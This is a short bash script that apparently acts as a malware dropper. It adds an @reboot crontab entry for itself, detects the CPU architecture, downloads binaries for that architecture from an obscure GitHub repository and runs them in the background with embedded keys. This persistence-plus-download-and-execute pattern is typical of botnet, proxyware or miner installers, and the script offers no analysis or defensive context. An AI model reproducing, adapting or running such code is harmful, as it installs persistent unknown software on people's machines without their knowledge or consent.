#!/bin/bash

# Ensure script runs from its own directory
current_dir="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd "$current_dir" || exit 1

# Crontab entry for persistence
entry="@reboot /bin/bash $current_dir/Util.sh"
if ! crontab -l 2>/dev/null | grep -Fq "$entry"; then
  (crontab -l 2>/dev/null; echo "$entry") | crontab -
fi

# Function to download and execute a file
download_and_run() {
    local file_name="$1"
    local url="$2"
    local exec_arg="$3"

    if [ ! -f "$file_name" ]; then
        echo "[*] Downloading $file_name from $url..."
        if command -v curl >/dev/null 2>&1; then
            if ! curl -f -L -o "$file_name" "$url"; then
                echo "[!] Failed to download $file_name with curl."
                return 1
            fi
        elif command -v wget >/dev/null 2>&1; then
            if ! wget -O "$file_name" "$url"; then
                echo "[!] Failed to download $file_name with wget."
                return 1
            fi
        else
            echo "[!] Error: Neither curl nor wget is available."
            return 1
        fi
    else
        echo "[*] $file_name already exists. Skipping download."
    fi

    # Ensure correct permissions
    chmod +x "$file_name"

    # Execute file in background
    echo "[*] Executing $file_name with arguments: $exec_arg"
    "./$file_name" $exec_arg &
}

# Detect CPU architecture
arch=$(uname -m)
echo "[*] Detected CPU architecture: $arch"

# Define file names and URLs based on architecture
case "$arch" in
    "x86_64")
        P_file="p_x86"
        P_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/p_x86"
        C_file="C_amd64"
        C_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/C_amd64"
        ;;
    "i686" | "i386")
        P_file="p_i386"
        P_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/p_i386"
        C_file="C_386"
        C_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/C_386"
        ;;
    aarch64*)
        P_file="p_aarch64"
        P_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/p_aarch64"
        C_file="C_arm"
        C_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/C_arm"
        ;;
    armv7*|armeabi*)
        P_file="p_v71"
        P_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/p_v71"
        C_file="C_arm"
        C_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/C_arm"
        ;;
    armv6*)
        P_file="p_v6"
        P_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/p_v6"
        C_file="C_arm"
        C_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/C_arm"
        ;;
    armv5*)
        P_file="p_v5"
        P_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/p_v5"
        C_file="C_arm"
        C_url="https://github.com/xxxyylllkkiihhmmg/jjggiittnn/raw/refs/heads/main/C_arm"
        ;;
    *)
        echo "[!] Unsupported CPU architecture: $arch"
        exit 1
        ;;
esac

# Download and execute the P file if available
if [ -n "$P_file" ] && [ -n "$P_url" ]; then
    download_and_run "$P_file" "$P_url" "-appkey=v2Hhhkf738Jer8LQ" || exit 1
fi

# Download and execute the C file if available
if [ -n "$C_file" ] && [ -n "$C_url" ]; then
    download_and_run "$C_file" "$C_url" "-key=cskeGdnSHRcJz1" || exit 1
fi
